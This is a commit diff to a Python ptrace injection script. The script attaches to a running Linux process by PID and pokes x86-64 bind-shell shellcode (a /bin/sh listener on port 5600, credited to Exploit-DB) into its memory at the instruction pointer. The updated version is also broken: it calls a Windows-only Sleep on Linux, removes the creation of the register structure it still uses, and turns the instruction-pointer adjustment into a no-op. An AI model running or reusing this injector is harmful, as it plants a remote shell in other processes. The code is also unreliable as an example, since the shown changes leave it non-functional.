8c529568296887b6625a59dc97338330157e9899
kimgywls <65155823+kimgywls@users.noreply.github.com>
2024-02-01 21:04:52 +0900

    Update injection.py

--- injection.py
+++ injection.py
@@ -5,11 +5,11 @@ import struct
 # Macros defined in <sys/ptrace.h>
 # https://code.woboq.org/qt5/include/sys/ptrace.h.html
 
-PTRACE_POKETEXT   = 4
-PTRACE_GETREGS    = 12
-PTRACE_SETREGS    = 13
-PTRACE_ATTACH     = 16
-PTRACE_DETACH     = 17
+PTRACE_POKETEXT = 4
+PTRACE_GETREGS = 12
+PTRACE_SETREGS = 13
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
 
 # Structure defined in <sys/user.h>
 # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
@@ -47,15 +47,15 @@ class user_regs_struct(ctypes.Structure):
 
 libc = ctypes.CDLL("libc.so.6")
 
-pid=int(sys.argv[1])
+pid = int(sys.argv[1])
 
-# Define argument type and respone type.
+# Define argument type and response type.
 libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
 libc.ptrace.restype = ctypes.c_uint64
 
 # Attach to the process
 libc.ptrace(PTRACE_ATTACH, pid, None, None)
-registers=user_regs_struct()
+ctypes.windll.kernel32.Sleep(1000) # Give some time to the process to stop
 
 # Retrieve the value stored in registers
 libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
@@ -65,22 +65,18 @@ print("Instruction Pointer: " + hex(registers.rip))
 print("Injecting Shellcode at: " + hex(registers.rip))
 
 # Shell code copied from exploit db.
-shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
+shellcode = b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
 # Inject the shellcode into the running process byte by byte.
-for i in xrange(0,len(shellcode),4):
- 
-  # Convert the byte to little endian.
-  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
-  shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
-  shellcode_byte=int(shellcode_byte_little_endian,16)
- 
-  # Inject the byte.
-  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
+for i in range(0, len(shellcode), 4):
+    # Convert the bytes to little-endian
+    shellcode_byte_int = int.from_bytes(shellcode[i:i + 4], byteorder='little')
+    # Inject the byte.
+    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte_int)
 
 print("Shellcode Injected!!")
 
-# Modify the instuction pointer
-registers.rip=registers.rip+2
+# Modify the instruction pointer
+registers.rip = registers.rip
 
 # Set the registers
 libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
